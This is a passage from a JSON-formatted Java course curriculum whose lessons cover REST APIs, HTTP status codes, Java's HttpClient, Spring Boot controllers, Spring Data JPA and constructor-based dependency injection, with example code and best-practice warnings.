              "content": "GET - Retrieve data (read-only, safe):\nGET /api/products\nResponse: [{ \"id\": 1, \"name\": \"Laptop\", \"price\": 999 }]\n\nPOST - Create new resource:\nPOST /api/products\nBody: { \"name\": \"Mouse\", \"price\": 25 }\nResponse: { \"id\": 2, \"name\": \"Mouse\", \"price\": 25 }\n\nPUT - Update entire resource:\nPUT /api/products/2\nBody: { \"name\": \"Wireless Mouse\", \"price\": 30 }\n\nPATCH - Update partial resource:\nPATCH /api/products/2\nBody: { \"price\": 28 }\n\nDELETE - Remove resource:\nDELETE /api/products/2\n\nIDEMPOTENT:\nGET, PUT, DELETE are idempotent (same result if called multiple times)\nPOST is NOT idempotent (creates new resource each time)"
            },
            {
              "type": "THEORY",
              "title": "JSON - JavaScript Object Notation",
              "content": "JSON is the standard data format for REST APIs:\n\nSIMPLE OBJECT:\n{\n    \"id\": 1,\n    \"name\": \"Alice\",\n    \"age\": 20,\n    \"active\": true\n}\n\nARRAY:\n[\"apple\", \"banana\", \"cherry\"]\n\nNESTED OBJECTS:\n{\n    \"user\": {\n        \"id\": 1,\n        \"name\": \"Alice\"\n    },\n    \"orders\": [\n        { \"id\": 101, \"total\": 50.00 },\n        { \"id\": 102, \"total\": 75.50 }\n    ]\n}\n\nDATA TYPES:\n- String: \"hello\" (double quotes only)\n- Number: 42, 3.14\n- Boolean: true, false\n- Null: null\n- Object: { }\n- Array: [ ]"
            },
            {
              "type": "THEORY",
              "title": "HTTP Status Codes - Response Indicators",
              "content": "2xx SUCCESS:\n200 OK - Request succeeded\n201 Created - Resource created (POST)\n204 No Content - Success but no body (DELETE)\n\n3xx REDIRECTION:\n301 Moved Permanently\n304 Not Modified (cached)\n\n4xx CLIENT ERRORS:\n400 Bad Request - Invalid data\n401 Unauthorized - Need authentication\n403 Forbidden - Authenticated but not allowed\n404 Not Found - Resource doesn't exist\n409 Conflict - Resource state conflict\n\n5xx SERVER ERRORS:\n500 Internal Server Error - Server crashed\n502 Bad Gateway - Upstream server failed\n503 Service Unavailable - Server overloaded\n\nEXAMPLE:\nGET /api/users/999\n→ 404 Not Found (user doesn't exist)\n\nPOST /api/users (with invalid data)\n→ 400 Bad Request"
            },
            {
              "type": "KEY_POINT",
              "title": "REST API is Like a Restaurant Menu",
              "content": "MENU (API Documentation):\nGET /api/dishes → View all dishes\nPOST /api/orders → Place an order\nGET /api/orders/123 → Check order status\n\nYOU (Client):\n\"I'll have the pasta\" (POST /api/orders { \"dish\": \"pasta\" })\n\nWAITER (HTTP):\nTakes your order to kitchen\n\nKITCHEN (Server):\nProcesses order, returns response\n\nRESULT:\n201 Created: { \"order_id\": 123, \"dish\": \"pasta\", \"status\": \"preparing\" }"
            },
            {
              "type": "KEY_POINT",
              "title": "REST API Best Practices",
              "content": "1. USE NOUNS, NOT VERBS IN URLS:\n   ✓ GET /api/users\n   ✗ GET /api/getUsers\n\n2. USE PLURAL NOUNS:\n   ✓ /api/users/123\n   ✗ /api/user/123\n\n3. USE HTTP METHODS FOR ACTIONS:\n   Don't: POST /api/users/delete/123\n   Do: DELETE /api/users/123\n\n4. VERSION YOUR API:\n   /api/v1/users\n   /api/v2/users\n\n5. RETURN APPROPRIATE STATUS CODES:\n   Success → 200\n   Created → 201\n   Not Found → 404\n\n6. USE QUERY PARAMETERS FOR FILTERING:\n   /api/users?age=20&active=true"
            },
            {
              "type": "WARNING",
              "title": "REST API Security and Best Practices",
              "content": "CRITICAL CONSIDERATIONS FOR PRODUCTION APIs:\n\n1. AUTHENTICATION IS REQUIRED\n   - Never expose APIs without authentication\n   - Use JWT tokens or OAuth2 for stateless auth\n   - API keys for service-to-service calls\n\n2. INPUT VALIDATION\n   - Never trust client data\n   - Validate all inputs on the server\n   - Sanitize data to prevent injection attacks\n\n3. RATE LIMITING\n   - Protect against abuse and DDoS\n   - Implement per-user and per-IP limits\n   - Return 429 Too Many Requests\n\n4. VERSIONING STRATEGY\n   - Plan for API evolution from day one\n   - URL versioning (/api/v1/) is most common\n   - Document deprecation timelines\n\n5. ERROR RESPONSES (RFC 7807 Problem Details)\n   - Never expose stack traces to clients\n   - Use RFC 7807 Problem Details for consistent error format\n   - Spring Boot 3.4+: Enable with spring.mvc.problemdetails.enabled=true\n   - Returns standardized fields: type, title, status, detail, instance\n   - Log details server-side for debugging"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-6-lesson-3",
          "title": "Lesson 10.3: HttpClient - Calling APIs from Java",
          "moduleId": "module-07",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Java Needs to Call External APIs",
              "content": "Modern applications don't exist in isolation:\n\n- Weather app → calls weather API\n- E-commerce → calls payment API\n- Social media → calls authentication API\n\nYour Java code needs to make HTTP requests to external services.\n\nJava 11+ provides: HttpClient (modern, built-in)\nBefore Java 11: HttpURLConnection (old, clunky)\nPopular library: Apache HttpClient\n\nWe'll use Java's modern HttpClient!"
            },
            {
              "type": "THEORY",
              "title": "Making a GET Request",
              "content": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\n\npublic class APIExample {\n    public static void main(String[] args) throws Exception {\n        // 1. Create HttpClient\n        HttpClient client = HttpClient.newHttpClient();\n        \n        // 2. Build request\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(\"https://api.example.com/users/123\"))\n            .GET()\n            .build();\n        \n        // 3. Send request and get response\n        HttpResponse<String> response = client.send(\n            request,\n            HttpResponse.BodyHandlers.ofString()\n        );\n        \n        // 4. Process response\n        System.out.println(\"Status: \" + response.statusCode());\n        System.out.println(\"Body: \" + response.body());\n    }\n}"
            },
            {
              "type": "THEORY",
              "title": "POST Request with JSON Body",
              "content": "import com.google.gson.Gson;\n\n// Create data object\nclass User {\n    String name;\n    int age;\n    \n    User(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n}\n\n// Convert to JSON\nGson gson = new Gson();\nUser newUser = new User(\"Alice\", 20);\nString json = gson.toJson(newUser);  // {\"name\":\"Alice\",\"age\":20}\n\n// Build POST request\nHttpRequest request = HttpRequest.newBuilder()\n    .uri(URI.create(\"https://api.example.com/users\"))\n    .header(\"Content-Type\", \"application/json\")\n    .POST(HttpRequest.BodyPublishers.ofString(json))\n    .build();\n\n// Send request\nHttpResponse<String> response = client.send(\n    request,\n    HttpResponse.BodyHandlers.ofString()\n);\n\n// Parse response\nif (response.statusCode() == 201) {\n    User created = gson.fromJson(response.body(), User.class);\n    System.out.println(\"Created user: \" + created.name);\n}"
            },
            {
              "type": "THEORY",
              "title": "Handling HTTP Headers",
              "content": "COMMON HEADERS:\n\nContent-Type: What format is the body?\n- application/json (JSON data)\n- application/x-www-form-urlencoded (form data)\n- text/html (HTML)\n\nAuthorization: Authentication token\n- Bearer <token>\n- Basic <base64-credentials>\n\nAccept: What format do you want back?\n- application/json\n\nSETTING HEADERS:\nHttpRequest request = HttpRequest.newBuilder()\n    .uri(URI.create(url))\n    .header(\"Content-Type\", \"application/json\")\n    .header(\"Authorization\", \"Bearer abc123xyz\")\n    .header(\"Accept\", \"application/json\")\n    .GET()\n    .build();\n\nREADING RESPONSE HEADERS:\nString contentType = response.headers()\n    .firstValue(\"content-type\")\n    .orElse(\"unknown\");"
            },
            {
              "type": "KEY_POINT",
              "title": "Error Handling for HTTP Requests",
              "content": "ALWAYS handle errors:\n\ntry {\n    HttpResponse<String> response = client.send(request, ...);\n    \n    // Check status code\n    if (response.statusCode() == 200) {\n        // Success!\n        String body = response.body();\n    } else if (response.statusCode() == 404) {\n        System.err.println(\"Resource not found\");\n    } else if (response.statusCode() >= 500) {\n        System.err.println(\"Server error: \" + response.statusCode());\n    } else {\n        System.err.println(\"Error: \" + response.statusCode());\n    }\n    \n} catch (IOException e) {\n    // Network error (can't reach server)\n    System.err.println(\"Network error: \" + e.getMessage());\n} catch (InterruptedException e) {\n    // Request was interrupted\n    System.err.println(\"Request interrupted\");\n}\n\nCOMMON ERRORS:\n- IOException: Network issues, timeout\n- 4xx codes: Client problems (bad request, not found)\n- 5xx codes: Server problems (crash, overload)"
            },
            {
              "type": "WARNING",
              "title": "HttpClient Production Considerations",
              "content": "WHEN USING HTTPCLIENT IN PRODUCTION:\n\n1. CONNECTION POOLING\n   - Reuse HttpClient instances (they are thread-safe)\n   - Creating new clients per request wastes resources\n   - Configure connection timeouts appropriately\n\n2. TIMEOUT CONFIGURATION\n   HttpClient client = HttpClient.newBuilder()\n       .connectTimeout(Duration.ofSeconds(10))\n       .build();\n\n3. ERROR HANDLING\n   - Handle IOException for network errors\n   - Handle InterruptedException for cancellation\n   - Check status codes (4xx, 5xx)\n\n4. HTTPS ONLY\n   - Never use HTTP for sensitive data\n   - Verify SSL certificates in production\n\n5. ASYNC FOR PERFORMANCE\n   - Use sendAsync() for non-blocking calls\n   - CompletableFuture for concurrent requests\n   - Consider reactive alternatives (WebClient)\n\n6. JSON LIBRARIES\n   - Gson is simple but Jackson is more powerful\n   - Consider using records for DTOs (Java 17+)\n\n7. VIRTUAL THREADS (Java 21+ / Spring Boot 3.4+)\n   - HttpClient uses virtual threads when enabled\n   - Set spring.threads.virtual.enabled=true\n   - Dramatically improves scalability for I/O-heavy apps\n   - No code changes needed - same blocking code, better performance"
            }
          ],
          "challenges": []
        }
      ],
      "order": 10
    },
    {
      "id": "module-11",
      "title": "Spring Boot",
      "description": "Build modern web applications with Spring Boot 3.4+, REST controllers, JPA, security, virtual threads, and RFC 7807 Problem Details.",
      "difficulty": "beginner",
      "estimatedHours": 5.1,
      "lessons": [
        {
          "id": "epoch-7-lesson-1",
          "title": "Lesson 11.1: Why Spring Boot?",
          "moduleId": "module-11",
          "order": 1,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Building Web Apps is Complex",
              "content": "To build a web API manually, you need to:\n- Set up a web server\n- Configure routing (which URL goes where)\n- Handle HTTP requests and responses\n- Connect to a database\n- Manage security\n- Handle errors\n\nThis is HUNDREDS of lines of configuration code before you even start building features!\n\nSpring Boot solves this: \"Convention over Configuration\"\n- Auto-configures everything\n- Provides sensible defaults\n- You focus on business logic, not plumbing"
            },
            {
              "type": "KEY_POINT",
              "title": "Spring Boot is Like IKEA Furniture",
              "content": "Building a web app from scratch:\n= Chopping down trees and making furniture from raw wood\n- Extremely difficult\n- Takes forever\n- Easy to mess up\n\nUsing Spring Boot:\n= IKEA pre-packaged furniture\n- All pieces provided\n- Clear instructions\n- Just assemble (write your business logic)\n\nSpring Boot gives you the framework, you add your app's unique features."
            },
            {
              "type": "THEORY",
              "title": "Your First Spring Boot Endpoint",
              "content": "A REST API endpoint in Spring Boot:\n\n@RestController\npublic class HelloController {\n    \n    @GetMapping(\"/hello\")\n    public String sayHello() {\n        return \"Hello, World!\";\n    }\n}\n\nThat's it! Spring Boot handles:\n- Starting a web server\n- Routing GET /hello to this method\n- Converting return value to HTTP response\n\nVisit http://localhost:8080/hello → See \"Hello, World!\""
            },
            {
              "type": "KEY_POINT",
              "title": "Key Spring Boot Concepts",
              "content": "@RestController - Marks a class as a web API controller\n@GetMapping - Maps HTTP GET requests to a method\n@PostMapping - Maps HTTP POST requests\n@RequestBody - Reads JSON from request\n@PathVariable - Extracts values from URL\n\nSpring Boot's magic: Annotations do the work!"
            },
            {
              "type": "KEY_POINT",
              "title": "Spring Boot 3.4 and Beyond - What's New",
              "content": "Spring Boot 3.4 Key Features (Released November 2024):\n\n1. VIRTUAL THREADS (Project Loom)\n   - Enable with: spring.threads.virtual.enabled=true\n   - Requires Java 21+, recommended Java 24+\n   - HttpClient, OtlpMeterRegistry, Undertow use virtual threads\n   - Massive scalability for I/O-heavy applications\n\n2. STRUCTURED LOGGING (Observability)\n   - Built-in support for ECS, Logstash, GELF formats\n   - Configure: logging.structured.format.console=ecs\n   - Use spring.application.group for application grouping\n   - Machine-readable logs for log management systems\n\n3. PROBLEM DETAILS (RFC 7807)\n   - Standardized error responses for APIs\n   - Enable: spring.mvc.problemdetails.enabled=true\n   - Returns: type, title, status, detail, instance fields\n   - Industry-standard error format\n\n4. @MockitoBean (Testing)\n   - Replaces deprecated @MockBean annotation\n   - Part of Spring Framework 6.2 core\n   - Use @MockitoSpyBean instead of @SpyBean\n   - Standardized mocking in integration tests\n\n5. DOCKER COMPOSE IMPROVEMENTS\n   - spring.docker.compose.start.arguments\n   - spring.docker.compose.stop.arguments\n   - Better container orchestration\n\nSPRING BOOT 4.0 (November 2025 Preview):\n- Jakarta EE 11 + Servlet 6.1 baseline\n- Java 17+ required, 25 recommended\n- HTTP Service Clients (interface-based)\n- Built-in API versioning support\n- GraalVM v25+ for native images\n\nWHY THIS MATTERS:\n- Better observability (structured logging)\n- Massive scalability (virtual threads)\n- Standardized errors (Problem Details)\n- Modern testing (@MockitoBean)"
            },
            {
              "type": "WARNING",
              "title": "Spring Boot Migration and Version Considerations",
              "content": "SPRING BOOT 3.4 MIGRATION NOTES:\n\n1. @MockBean DEPRECATION (Spring Boot 3.4)\n   - @MockBean and @SpyBean are deprecated\n   - Replace with: @MockitoBean and @MockitoSpyBean\n   - Note: Not a direct 1-to-1 replacement\n   - @MockitoBean only works on fields, not types\n\n2. VIRTUAL THREADS CAUTION\n   - Virtual threads require Java 21+\n   - ThreadLocal usage needs review\n   - Some libraries may not be compatible\n   - Test thoroughly before enabling in production\n\n3. STRUCTURED LOGGING SETUP\n   - Choose format: ecs, logstash, or gelf\n   - Configure log aggregation system accordingly\n   - Use spring.application.group for multi-app setups\n\nFUTURE: SPRING BOOT 4.0 (November 2025)\n- All javax.* imports must become jakarta.*\n- Check migration guide at spring.io\n\n4. DEVELOPMENT VS PRODUCTION\n   - This course teaches concepts, not production setup\n   - Production apps need: proper security, monitoring, logging\n   - Consider Spring Cloud for microservices"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-7-lesson-2",
          "title": "Lesson 11.2: REST Controllers - Building Your API",
          "moduleId": "module-11",
          "order": 2,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Creating a Complete REST API",
              "content": "Let's build a User API with full CRUD operations:\n\n@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    \n    private List<User> users = new ArrayList<>();\n    \n    // GET all users\n    @GetMapping\n    public List<User> getAllUsers() {\n        return users;\n    }\n    \n    // GET single user by ID\n    @GetMapping(\"/{id}\")\n    public User getUserById(@PathVariable Long id) {\n        return users.stream()\n            .filter(u -> u.getId().equals(id))\n            .findFirst()\n            .orElse(null);\n    }\n    \n    // POST create new user\n    @PostMapping\n    public User createUser(@RequestBody User user) {\n        users.add(user);\n        return user;\n    }\n    \n    // PUT update user\n    @PutMapping(\"/{id}\")\n    public User updateUser(@PathVariable Long id, @RequestBody User updated) {\n        // Find and update user\n        return updated;\n    }\n    \n    // DELETE user\n    @DeleteMapping(\"/{id}\")\n    public void deleteUser(@PathVariable Long id) {\n        users.removeIf(u -> u.getId().equals(id));\n    }\n}"
            },
            {
              "type": "THEORY",
              "title": "Key Annotations Explained",
              "content": "@RestController:\n- Combines @Controller + @ResponseBody\n- Returns data (JSON) instead of views (HTML)\n- Every method returns data, not page names\n\n@RequestMapping(\"/api/users\"):\n- Base URL for all methods in this controller\n- Methods add to this path\n\n@GetMapping, @PostMapping, etc.:\n- Shorthand for @RequestMapping(method = GET/POST)\n- Maps HTTP method to Java method\n\n@PathVariable:\n- Extracts value from URL path\n- /api/users/{id} → @PathVariable Long id\n- /api/users/123 → id = 123\n\n@RequestBody:\n- Reads JSON from request body\n- Automatically converts JSON to Java object\n- POST/PUT requests with data\n\n@RequestParam:\n- Extracts query parameters\n- /api/users?age=20 → @RequestParam int age"
            },
            {
              "type": "THEORY",
              "title": "ResponseEntity - Better Control",
              "content": "Return ResponseEntity for more control over HTTP response:\n\n@GetMapping(\"/{id}\")\npublic ResponseEntity<User> getUserById(@PathVariable Long id) {\n    User user = findUserById(id);\n    \n    if (user == null) {\n        return ResponseEntity.notFound().build();  // 404\n    }\n    \n    return ResponseEntity.ok(user);  // 200 with body\n}\n\n@PostMapping\npublic ResponseEntity<User> createUser(@RequestBody User user) {\n    User saved = userService.save(user);\n    return ResponseEntity\n        .status(HttpStatus.CREATED)  // 201\n        .body(saved);\n}\n\nBENEFITS:\n- Set custom status codes\n- Add headers\n- Full control over response"
            },
            {
              "type": "THEORY",
              "title": "Exception Handling",
              "content": "Handle errors gracefully:\n\n@RestControllerAdvice\npublic class GlobalExceptionHandler {\n    \n    @ExceptionHandler(UserNotFoundException.class)\n    public ResponseEntity<ErrorResponse> handleUserNotFound(UserNotFoundException ex) {\n        ErrorResponse error = new ErrorResponse(\n            \"User not found\",\n            ex.getMessage()\n        );\n        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(error);\n    }\n    \n    @ExceptionHandler(IllegalArgumentException.class)\n    public ResponseEntity<ErrorResponse> handleBadRequest(IllegalArgumentException ex) {\n        ErrorResponse error = new ErrorResponse(\n            \"Invalid request\",\n            ex.getMessage()\n        );\n        return ResponseEntity.badRequest().body(error);\n    }\n}\n\nWhen controller throws UserNotFoundException:\n→ Handler catches it\n→ Returns 404 with error message"
            },
            {
              "type": "KEY_POINT",
              "title": "Validation with Spring Boot",
              "content": "Use Bean Validation annotations:\n\npublic class User {\n    @NotNull(message = \"ID is required\")\n    private Long id;\n    \n    @NotBlank(message = \"Name cannot be empty\")\n    @Size(min = 2, max = 100, message = \"Name must be 2-100 characters\")\n    private String name;\n    \n    @Min(value = 18, message = \"Must be at least 18\")\n    private int age;\n    \n    @Email(message = \"Invalid email format\")\n    private String email;\n}\n\nIn controller:\n@PostMapping\npublic ResponseEntity<User> createUser(@Valid @RequestBody User user) {\n    // If validation fails, Spring returns 400 automatically\n    return ResponseEntity.ok(userService.save(user));\n}\n\n@Valid triggers validation!\nInvalid request → 400 Bad Request with error details"
            },
            {
              "type": "WARNING",
              "title": "REST Controller Best Practices",
              "content": "AVOID COMMON CONTROLLER MISTAKES:\n\n1. CONTROLLER SHOULD BE THIN\n   - No business logic in controllers\n   - Delegate to service layer\n   - Controllers only handle HTTP concerns\n\n2. USE DTOs (Data Transfer Objects)\n   - Never expose entities directly\n   - DTOs hide internal structure\n   - Separate input/output DTOs if needed\n\n3. PROPER HTTP STATUS CODES\n   - 201 for resource creation (not 200)\n   - 204 for successful deletion\n   - 400 for validation errors\n   - 404 for not found\n\n4. VALIDATION IS REQUIRED\n   - Always use @Valid on @RequestBody\n   - Bean Validation annotations on DTOs\n   - Custom validators for complex rules\n\n5. EXCEPTION HANDLING (Spring Boot 3.4+)\n   - Use @RestControllerAdvice globally\n   - Never expose stack traces\n   - Enable RFC 7807 Problem Details:\n     spring.mvc.problemdetails.enabled=true\n   - Return ProblemDetail objects for errors\n   - Standard format: type, title, status, detail, instance"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-7-lesson-3",
          "title": "Lesson 11.3: Spring Data JPA - No More SQL!",
          "moduleId": "module-11",
          "order": 3,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Writing SQL is Repetitive",
              "content": "Every entity needs similar code:\n\nfindAll(), findById(), save(), deleteById()...\n\nWriting JDBC code:\n- PreparedStatement for every query\n- ResultSet parsing\n- Connection management\n- Hundreds of lines of boilerplate!\n\nSpring Data JPA eliminates this:\n- Auto-generates common queries\n- Maps Java objects to database tables\n- Handles connections automatically\n- You write interfaces, Spring implements them!"
            },
            {
              "type": "THEORY",
              "title": "Creating an Entity",
              "content": "@Entity tells JPA this maps to a database table:\n\n@Entity\n@Table(name = \"users\")  // Optional: custom table name\npublic class User {\n    \n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    @Column(name = \"full_name\", nullable = false, length = 100)\n    private String name;\n    \n    @Column(nullable = false)\n    private int age;\n    \n    @Column(unique = true)\n    private String email;\n    \n    // Getters and setters\n}\n\n@Entity - Marks as database entity\n@Id - Primary key\n@GeneratedValue - Auto-increment\n@Column - Column properties"
            },
            {
              "type": "THEORY",
              "title": "Creating a Repository",
              "content": "Extend JpaRepository - Spring does the rest:\n\npublic interface UserRepository extends JpaRepository<User, Long> {\n    // That's it! Spring generates implementation\n}\n\nFREE METHODS (no code needed):\n- findAll() → SELECT * FROM users\n- findById(id) → SELECT * FROM users WHERE id = ?\n- save(user) → INSERT or UPDATE\n- deleteById(id) → DELETE FROM users WHERE id = ?\n- count() → SELECT COUNT(*) FROM users\n- existsById(id) → Check if exists\n\nUsage in service:\n\n@Service\npublic class UserService {\n    @Autowired\n    private UserRepository userRepository;\n    \n    public List<User> getAllUsers() {\n        return userRepository.findAll();\n    }\n    \n    public User saveUser(User user) {\n        return userRepository.save(user);\n    }\n}"
            },
            {
              "type": "THEORY",
              "title": "Custom Query Methods",
              "content": "Spring Data JPA generates queries from method names!\n\npublic interface UserRepository extends JpaRepository<User, Long> {\n    \n    // Find by name\n    List<User> findByName(String name);\n    // SELECT * FROM users WHERE name = ?\n    \n    // Find by age greater than\n    List<User> findByAgeGreaterThan(int age);\n    // SELECT * FROM users WHERE age > ?\n    \n    // Find by email containing\n    List<User> findByEmailContaining(String keyword);\n    // SELECT * FROM users WHERE email LIKE %?%\n    \n    // Find by name and age\n    List<User> findByNameAndAge(String name, int age);\n    // SELECT * FROM users WHERE name = ? AND age = ?\n    \n    // Check if exists\n    boolean existsByEmail(String email);\n    \n    // Count by age\n    long countByAge(int age);\n}\n\nMETHOD NAME KEYWORDS:\n- findBy, getBy, queryBy\n- And, Or\n- GreaterThan, LessThan, Between\n- Like, Containing, StartingWith, EndingWith\n- OrderBy...Asc, OrderBy...Desc"
            },
            {
              "type": "THEORY",
              "title": "Custom JPQL Queries",
              "content": "For complex queries, write JPQL (like SQL but for Java objects):\n\npublic interface UserRepository extends JpaRepository<User, Long> {\n    \n    @Query(\"SELECT u FROM User u WHERE u.age > :minAge AND u.age < :maxAge\")\n    List<User> findUsersByAgeRange(@Param(\"minAge\") int min, @Param(\"maxAge\") int max);\n    \n    @Query(\"SELECT u FROM User u WHERE u.name LIKE %:keyword%\")\n    List<User> searchByName(@Param(\"keyword\") String keyword);\n    \n    @Query(value = \"SELECT * FROM users WHERE age > ?1\", nativeQuery = true)\n    List<User> findUsingNativeSQL(int age);\n}\n\n@Query - Custom JPQL query\n@Param - Named parameter\nnativeQuery = true - Use actual SQL instead of JPQL"
            },
            {
              "type": "KEY_POINT",
              "title": "Service Layer Pattern",
              "content": "BEST PRACTICE: Controller → Service → Repository\n\n@RestController\npublic class UserController {\n    @Autowired\n    private UserService userService;  // Not Repository!\n    \n    @GetMapping(\"/api/users\")\n    public List<User> getAll() {\n        return userService.getAllUsers();\n    }\n}\n\n@Service\npublic class UserService {\n    @Autowired\n    private UserRepository userRepository;\n    \n    public List<User> getAllUsers() {\n        return userRepository.findAll();\n    }\n    \n    public User createUser(User user) {\n        // Business logic here\n        validateUser(user);\n        return userRepository.save(user);\n    }\n}\n\nWHY?\n- Separation of concerns\n- Business logic in service, not controller\n- Easier to test\n- Reusable services"
            },
            {
              "type": "WARNING",
              "title": "JPA and Database Best Practices",
              "content": "CRITICAL JPA CONSIDERATIONS:\n\n1. NEVER USE ddl-auto IN PRODUCTION\n   - Use: spring.jpa.hibernate.ddl-auto=validate\n   - Use Flyway or Liquibase for migrations\n   - ddl-auto=update can cause data loss\n\n2. N+1 QUERY PROBLEM\n   - Lazy loading can cause performance issues\n   - Use @EntityGraph or JOIN FETCH\n   - Monitor with spring.jpa.show-sql=true\n\n3. TRANSACTION MANAGEMENT\n   - Use @Transactional on service methods\n   - Understand propagation and isolation\n   - Avoid long transactions\n\n4. ENTITY RELATIONSHIPS\n   - Prefer @ManyToOne over @OneToMany\n   - Avoid bidirectional if possible\n   - Use cascade carefully (especially REMOVE)\n\n5. CONNECTION POOLING\n   - HikariCP is the default (and best)\n   - Configure pool size appropriately\n   - Monitor connection leaks"
            }
          ],
          "challenges": []
        },
        {
          "id": "epoch-7-lesson-4",
          "title": "Lesson 11.4: Dependency Injection - The Heart of Spring",
          "moduleId": "module-11",
          "order": 4,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Classes That Create Their Own Dependencies",
              "content": "Without dependency injection:\n\npublic class UserController {\n    private UserService userService = new UserService();  // BAD!\n    \n    public User getUser(Long id) {\n        return userService.findById(id);\n    }\n}\n\nPROBLEMS:\n❌ Tight Coupling - UserController is glued to UserService\n❌ Hard to Test - Can't replace UserService with a mock\n❌ Inflexible - Can't swap implementations\n❌ Manual Lifecycle - You manage object creation\n\nWhat if UserService needs a database connection?\nNow UserController must manage that too!\n\nSolution: DEPENDENCY INJECTION (DI)"
            },
            {
              "type": "KEY_POINT",
              "title": "Dependency Injection is Like a Restaurant Kitchen",
              "content": "WITHOUT DI (You Make Everything):\n- Build your own stove\n- Raise your own chickens\n- Grow your own vegetables\n- Make your own plates\n- THEN cook dinner\n\nThis is like 'new UserService()' - you manage everything!\n\nWITH DI (Restaurant Provides Everything):\n- Professional stove (already installed)\n- Fresh ingredients (delivered daily)\n- Clean dishes (washed and ready)\n- Trained staff\n\nYou just: COOK THE MEAL\n\nSpring Container = Kitchen Manager:\n1. Knows about all beans (objects it manages)\n2. Creates them when needed\n3. Injects them where required\n4. Manages lifecycle (startup, shutdown)"
            },
            {
              "type": "THEORY",
              "title": "Spring Boot 4 Best Practice: Constructor Injection",
              "content": "Mark classes as Spring beans:\n\n@Service\npublic class UserService {\n    private final UserRepository userRepository;\n    \n    // Constructor injection (BEST PRACTICE)\n    public UserService(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n    \n    public User findById(Long id) {\n        return userRepository.findById(id).orElse(null);\n    }\n}\n\nThen inject into controllers:\n\n@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    private final UserService userService;\n    \n    // Spring automatically injects UserService\n    // No @Autowired needed for single constructor!\n    public UserController(UserService userService) {\n        this.userService = userService;\n    }\n    \n    @GetMapping(\"/{id}\")\n    public User getUser(@PathVariable Long id) {\n        return userService.findById(id);\n    }\n}\n\nThe full stack:\nController → Service → Repository → Database\nSpring wires this chain automatically!"
            },
            {
              "type": "THEORY",
              "title": "Spring Stereotype Annotations",
              "content": "These tell Spring to manage a class as a bean:\n\n@Component - Generic bean (utility classes)\n@Service - Business logic layer\n@Repository - Data access layer\n@Controller - Web MVC controller (returns HTML)\n@RestController - REST API controller (returns JSON)\n\nExample:\n\n@Service\npublic class EmailService {\n    // Spring manages this\n}\n\n@Repository\npublic interface UserRepository extends JpaRepository<User, Long> {\n    // Spring implements this\n}\n\nAll of these are variations of @Component!"
            },
            {
              "type": "THEORY",
              "title": "Why Constructor Injection with 'final'?",
              "content": "@Service\npublic class OrderService {\n    private final UserService userService;      // final = immutable\n    private final PaymentService paymentService;\n    \n    public OrderService(UserService userService, \n                       PaymentService paymentService) {\n        this.userService = userService;\n        this.paymentService = paymentService;\n    }\n}\n\nBENEFITS OF 'final':\n✓ Guarantees field is set exactly once\n✓ Thread-safe\n✓ Makes dependencies explicit\n✓ Prevents accidental reassignment\n\nWhen Spring starts:\n1. Scans for @Component, @Service, etc.\n2. Creates instances\n3. Calls constructors with required dependencies\n4. Stores beans in Application Context"
            },
            {
              "type": "THEORY",
              "title": "⚠️ Avoid Field Injection (Old Way)",
              "content": "❌ OLD STYLE - Not recommended in Spring Boot 4:\n\n@Service\npublic class OldStyleService {\n    @Autowired\n    private UserRepository userRepository;  // Field injection\n}\n\nWHY AVOID?\n- Cannot make field 'final'\n- Harder to test (requires reflection)\n- Dependencies not explicit\n- Nullable references possible\n\n✓ MODERN STYLE - Use constructor injection:\n\n@Service\npublic class ModernService {\n    private final UserRepository userRepository;\n    \n    public ModernService(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "When @Autowired IS Still Needed",
              "content": "Only when you have MULTIPLE constructors:\n\n@Service\npublic class FlexibleService {\n    private final UserService userService;\n    private final Optional<CacheService> cacheService;\n    \n    // Tell Spring to use THIS constructor\n    @Autowired\n    public FlexibleService(UserService userService,\n                          @Autowired(required = false) CacheService cache) {\n        this.userService = userService;\n        this.cacheService = Optional.ofNullable(cache);\n    }\n    \n    // Alternative constructor for testing\n    public FlexibleService(UserService userService) {\n        this(userService, null);\n    }\n}\n\nBEAN SCOPES:\nBy default, beans are Singleton (one instance):\n\n@Service  // Singleton by default\npublic class UserService { }\n\nOther scopes:\n@Service\n@Scope(\"prototype\")  // New instance every time\npublic class PrototypeService { }\n\nMost of the time, Singleton is what you want!"
            },
            {
              "type": "THEORY",
              "title": "💻 Complete Multi-Layer Service",
